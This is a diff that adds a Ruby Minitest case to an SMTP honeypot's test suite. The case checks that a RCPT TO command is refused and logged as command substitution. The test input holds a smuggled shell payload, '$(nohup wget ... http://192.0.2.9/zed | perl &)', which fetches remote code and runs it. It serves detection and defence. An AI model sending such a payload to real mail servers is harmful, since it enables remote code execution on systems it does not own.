@@ -150,6 +150,23 @@ class SmtpHoneypotSessionTest < Minitest::Test
     assert_equal "exim_run", event[:signature]
   end
 
+  # The dropper shape seen against production: command substitution with no
+  # system path in it, smuggled through a quoted RCPT local-part. Recorded
+  # and refused before rcpt_to ever sees it.
+  def test_shell_dropper_in_rcpt_local_part_is_recorded_and_refused
+    with_session(role: :mx, spec_extra: {}) do |client|
+      read_reply(client)
+      command(client, "MAIL FROM:<hello@info.test>")
+      reply = command(client, 'RCPT TO:<"x: Service status change: localhost $(nohup wget -qO - ' \
+                              'http://192.0.2.9/zed | perl &) changed from stopped to running"@cve.invalid>')
+      assert_match(/\A502/, reply, "probe must be refused, not dispatched as RCPT")
+      command(client, "QUIT")
+    end
+
+    assert_equal 1, @store.honeypot_events.size
+    assert_equal "command_substitution", @store.honeypot_events.first[:signature]
+  end
+
   def test_vrfy_root_reconnaissance_is_flagged
     with_session(role: :mx, spec_extra: {}) do |client|
       read_reply(client)
